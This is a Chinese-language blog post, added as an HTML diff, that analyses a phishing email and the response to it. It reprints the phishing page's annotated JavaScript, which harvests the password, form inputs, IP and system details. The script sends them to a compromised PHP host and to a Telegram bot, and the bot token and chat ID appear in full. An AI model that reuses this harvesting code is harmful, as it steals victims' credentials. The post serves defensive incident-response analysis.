@@ -1,0 +1,327 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8" >
+
+<title>记一次钓鱼邮件的应急响应 | chriskali&#39;s blog</title>
+
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+
+<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.2/css/all.css" integrity="sha384-fnmOCqbTlWIlj8LyTjo7mOUStjsKC4pOpQbqyi7RrhN7udi9RwhKkMHpvLbHG9Sr" crossorigin="anonymous">
+<link rel="shortcut icon" href="https://chriskalix.github.io/favicon.ico?v=1625902770692">
+<link rel="stylesheet" href="https://chriskalix.github.io/styles/main.css">
+
+
+
+<link rel="stylesheet" href="https://unpkg.com/aos@next/dist/aos.css" />
+<script src="https://cdn.jsdelivr.net/npm/vue/dist/vue.js"></script>
+
+
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-181013881-1"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'UA-181013881-1');
+</script>
+
+
+    <meta name="description" content="
+最近碰到一次钓鱼邮件的问题，比较简单，分析一下
+
+样本
+邮件样本比较粗糙，直接群发到一个邮件群组。带了一个 html 的 payload，放进虚拟机中，切网络打开，发现就一个正常的登录页面，以及几个判断IP的请求。
+
+文件拉到vscode..." />
+    <meta name="keywords" content="" />
+  </head>
+  <body>
+    <div id="app" class="main">
+
+      <div class="sidebar" :class="{ 'full-height': menuVisible }">
+  <div class="top-container" data-aos="fade-right">
+    <div class="top-header-container">
+      <a class="site-title-container" href="https://chriskalix.github.io">
+        <img src="https://chriskalix.github.io/images/avatar.png?v=1625902770692" class="site-logo">
+        <h1 class="site-title">chriskali&#39;s blog</h1>
+      </a>
+      <div class="menu-btn" @click="menuVisible = !menuVisible">
+        <div class="line"></div>
+      </div>
+    </div>
+    <div>
+      
+        
+          <a href="/" class="site-nav">
+            首页
+          </a>
+        
+      
+        
+          <a href="/archives" class="site-nav">
+            归档
+          </a>
+        
+      
+        
+          <a href="/tags" class="site-nav">
+            标签
+          </a>
+        
+      
+        
+          <a href="/post/about" class="site-nav">
+            关于
+          </a>
+        
+      
+    </div>
+  </div>
+  <div class="bottom-container" data-aos="flip-up" data-aos-offset="0">
+    <div class="social-container">
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    </div>
+    <div class="site-description">
+      Keep learning
+    </div>
+    <div class="site-footer">
+      chriskalix | <a class="rss" href="https://chriskalix.github.io/atom.xml" target="_blank">RSS</a>
+    </div>
+  </div>
+</div>
+
+
+      <div class="main-container">
+        <div class="content-container" data-aos="fade-up">
+          <div class="post-detail">
+            <h2 class="post-title">记一次钓鱼邮件的应急响应</h2>
+            <div class="post-date">2021-07-10</div>
+            
+            <div class="post-content" v-pre>
+              <blockquote>
+<p>最近碰到一次钓鱼邮件的问题，比较简单，分析一下</p>
+</blockquote>
+<h2 id="样本">样本</h2>
+<p>邮件样本比较粗糙，直接群发到一个邮件群组。带了一个 html 的 payload，放进虚拟机中，切网络打开，发现就一个正常的登录页面，以及几个判断IP的请求。<br>
+<img src="https://chriskalix.github.io/post-images/1625899820992.png" alt="" loading="lazy"><br>
+文件拉到<code>vscode</code>里面人肉看一下</p>
+<h3 id="前置信息">前置信息</h3>
+<pre><code class="language-javascript">// 发送的地址
+var sendurl = &quot;https://greatermekong.org/sites/all/libraries/mailchimp/vendor/phpunit/phpunit/src/Util/PHP/sulesludetails/host.php&quot;;
+// 尝试次数
+var attemptcount = 0;
+// 判断一下 XMLHTTPRequest
+if (typeof XMLHttpRequest === &quot;undefined&quot;) {
+  XMLHttpRequest = function () {
+    try { return new ActiveXObject(&quot;Msxml2.XMLHTTP.6.0&quot;); }
+    catch (e) {}
+    try { return new ActiveXObject(&quot;Msxml2.XMLHTTP.3.0&quot;); }
+    catch (e) {}
+    try { return new ActiveXObject(&quot;Microsoft.XMLHTTP&quot;); }
+    catch (e) {}
+    throw new Error(&quot;This browser does not support XMLHttpRequest.&quot;);
+  };
+}
+</code></pre>
+<pre><code class="language-javascript">// 开启事件监听
+window.addEventListener('load', (event) =&gt; {
+// 获取日期，输入，操作系统等信息
+window.nowdate = new Date();
+theif = &quot;\nPage = &quot; + document.title;
+imputs = document.getElementsByTagName('input');
+lastIndex = imputs.length;
+window.OSName = &quot;Unknown&quot;;
+if (window.navigator.userAgent.indexOf(&quot;Windows NT 10.0&quot;)!= -1) OSName=&quot;Windows 10&quot;;
+if (window.navigator.userAgent.indexOf(&quot;Windows NT 6.2&quot;) != -1) OSName=&quot;Windows 8&quot;;
+if (window.navigator.userAgent.indexOf(&quot;Windows NT 6.1&quot;) != -1) OSName=&quot;Windows 7&quot;;
+if (window.navigator.userAgent.indexOf(&quot;Windows NT 6.0&quot;) != -1) OSName=&quot;Windows Vista&quot;;
+if (window.navigator.userAgent.indexOf(&quot;Windows NT 5.1&quot;) != -1) OSName=&quot;Windows XP&quot;;
+if (window.navigator.userAgent.indexOf(&quot;Windows NT 5.0&quot;) != -1) OSName=&quot;Windows 2000&quot;;
+if (window.navigator.userAgent.indexOf(&quot;Mac&quot;)            != -1) OSName=&quot;Mac/iOS&quot;;
+if (window.navigator.userAgent.indexOf(&quot;X11&quot;)            != -1) OSName=&quot;UNIX&quot;;
+if (window.navigator.userAgent.indexOf(&quot;Linux&quot;)          != -1) OSName=&quot;Linux&quot;;
+if (window.navigator.userAgent.indexOf(&quot;Android&quot;)        != -1) OSName=&quot;Android&quot;;
+if (window.navigator.userAgent.indexOf(&quot;iPhone&quot;)         != -1) OSName=&quot;iPhone&quot;;
+if (window.navigator.userAgent.indexOf(&quot;iPad&quot;)           != -1) OSName=&quot;iPad&quot;;
+if (window.navigator.userAgent.indexOf(&quot;iPod&quot;)           != -1) OSName=&quot;iPod&quot;;
+if (window.navigator.userAgent.indexOf(&quot;BlackBerry&quot;)     != -1) OSName=&quot;BlackBerry&quot;;
+});
+</code></pre>
+<p>函数1：<code>createCORSRequest</code> 发起CORS跨域请求</p>
+<pre><code class="language-javascript">function createCORSRequest(method, url){
+  var xhr = new XMLHttpRequest();
+  // withCredentials 属性设置
+  if (&quot;withCredentials&quot; in xhr){
+    xhr.open(method, url, false);
+ // 这个是 IE8 &amp; IE9 对 CORS 的实现
+  } else if (typeof XDomainRequest != &quot;undefined&quot;){
+    xhr = new XDomainRequest();
+    xhr.open(method, url);
+  } else {
+    xhr = null;
+  }
+  return xhr;
+}
+</code></pre>
+<p>函数2：<code>senddataPOST</code> 发起请求</p>
+<pre><code class="language-javascript">function senddataPOST() {
+    // 浏览器是否在线(查看是否脱机的)
+	if (navigator.onLine == true) {
+        // 初始化基本信息的结构
+		if (typeof objs == &quot;undefined&quot;) {
+			var objs = {
+				ip: &quot;&quot;,
+				country_name: &quot;&quot;,
+				city: &quot;&quot;,
+				region: &quot;&quot;,
+				currency: &quot;&quot;
+			};
+            // 初始化 XMLHttpRequest 对象
+			var xhttp = new XMLHttpRequest();
+            // onreadystatechange，当存储函数或者函数名的 readyState 属性发生改变的时候，就会调用到该函数，0代表初始化，1代表建立连接，2代表请求已接受，3请求处理中，4请求完成
+			xhttp.onreadystatechange = function () {
+				if (this.readyState == 4 &amp;&amp; this.status == 200) {
+					var rec = JSON.parse(this.responseText);
+					window.rec = rec;
+				}
+			};
+            // 获取 IP请求
+			xhttp.open(&quot;GET&quot;, &quot;https://jsonip.com/&quot;, false);
+			xhttp.send();
+		}
+		objs.ip = rec.ip;
+		objs.country_name = &quot;&quot;;
+		objs.city = &quot;&quot;;
+		objs.region = &quot;&quot;;
+		objs.currency = &quot;&quot;;
+        // 获取 IP 地址
+		theif = &quot;IP Address = &quot; + objs.ip;
+        // 获取网页名
+		theif += &quot;\nPage = &quot; + document.title;
+        // 获取当前事件
+		theif += &quot;\nTime = &quot; + nowdate;
+        // 获取系统以及操作语言
+		theif += &quot;\nSystem = &quot; + OSName + &quot; &quot; + navigator.language;
+        // 获取当前窗口大小
+		theif += &quot;\nScreen Size = &quot; + screen.width + &quot; X &quot; + screen.height;
+        // 获取 window.location &lt;=&gt; 这个比较鸡贼，可以看到文件路径
+		theif += &quot;\nLocation = &quot; + window.location + &quot;\nPassword = &quot; + password.value;
+		for (index = 0; index &lt; imputs.length; ++index) {
+			if (imputs[index].type != &quot;submit&quot; &amp;&amp; imputs[index].name != &quot;&quot; &amp;&amp; imputs[index].value != &quot;&quot;) {
+				theif += &quot;\n&quot; + imputs[index].name + '=' + encodeURI(imputs[index].value);
+			}
+		}
+        // 获取 User-Agent
+		theif += &quot;\nUser-Agent = &quot; + navigator.userAgent;
+        // 获取 IP 详情
+		theif += &quot;\nIP Details = https://ipinfo.io/&quot; + objs.ip + &quot;/json&quot;;
+        // 走 TG 的方式，类似于 slack bot?
+		var url_telegram = &quot;https://api.telegram.org/&quot;;
+		var randtoken = &quot;bot1257337675&quot;;
+		var token = &quot;:AAHDZVp72afEEmv4n6WqVFZ-_CxfvOedcso/&quot;;
+		var iden = &quot;sendMessage?chat_id=-1001228517612&amp;text=&quot;;
+		var createdCORSRequest = url_telegram + randtoken + token + iden;
+		var request = createCORSRequest(&quot;POST&quot;, createdCORSRequest + encodeURI(theif));
+		if (request) {
+			if (request.send()) {
+				return true;
+			}
+		}
+	} else {
+		return true;
+	}
+}
+</code></pre>
+<p>函数3：<code>postdata</code> 发起 post请求<br>
+这个没啥好说的，就是发信息</p>
+<pre><code class="language-javascript">function postdata() {
+	var xhttp = new XMLHttpRequest();
+	xhttp.onreadystatechange = function () {
+		if (this.readyState == 4 &amp;&amp; this.status == 200) {
+			if (this.responseText == &quot;ok&quot;) {
+				senddataPOST();
+				var address = email.value.split(&quot;@&quot;)[1];
+				document.getElementById(&quot;messagefont&quot;).innerHTML = &quot;&quot;;
+				document.getElementById(&quot;font-weight-light&quot;).innerHTML = &quot;&quot;;
+				document.getElementById(&quot;form-holder&quot;).innerHTML = '&lt;font color=&quot;green&quot;&gt;' + successmsg +
+				'&lt;/font&gt;';
+				var meta = document.createElement('meta');
+				meta.setAttribute('http-equiv', 'refresh');
+				meta.setAttribute('content', '8; url=http://' + address);
+				document.getElementsByTagName('head')[0].appendChild(meta);
+			} else {
+				document.getElementById(&quot;messagefont&quot;).innerHTML = checkpassword;
+				document.getElementById(&quot;password&quot;).value = &quot;&quot;;
+				document.getElementById('submit-btn').innerHTML = continuebutton;
+				password.focus();
+			}
+		}
+	};
+	xhttp.open(&quot;GET&quot;, sendurl + &quot;?type=Webmail&amp;email=&quot; + btoa(email.value) + &quot;&amp;password=&quot; + btoa(password.value),
+		true);
+	xhttp.send();
+}
+</code></pre>
+<h2 id="处置止损">处置止损</h2>
+<p>我们看到关键的俩域名，一个是 <code>api.telegram.org</code>，一个是<code>greatermekong.org</code> （还有一个获取IP信息的我们暂时不算）。将以下俩域名直接劫持到别的 <code>IP</code> 下</p>
+<h2 id="后续清理">后续清理</h2>
+<p>在办公网的 DNS 日志中，追溯域名的<code>DNS</code>解析，发现暂无人员点开。再统一发送邮件告知风险等...一次相对简单的邮件钓鱼应急就此收官</p>
+
+            </div>
+            
+            
+              <div class="next-post">
+                <div class="next">下一篇</div>
+                <a href="https://chriskalix.github.io/post/KiG7NqeDi/">
+                  <h3 class="post-title">
+                    Flink 实战开发笔记
+                  </h3>
+                </a>
+              </div>
+            
+
+            
+
+          </div>
+
+        </div>
+      </div>
+    </div>
+
+    <script src="https://unpkg.com/aos@next/dist/aos.js"></script>
+<script type="application/javascript">
+
+AOS.init();
+
+var app = new Vue({
+  el: '#app',
+  data: {
+    menuVisible: false,
+  },
+})
+
+</script>
+
+
+  <script src="https://cdn.bootcss.com/highlight.js/9.12.0/highlight.min.js"></script>
+  <script>
+    hljs.initHighlightingOnLoad()
+  </script>
+
+
+
+
+
+  </body>
+</html>
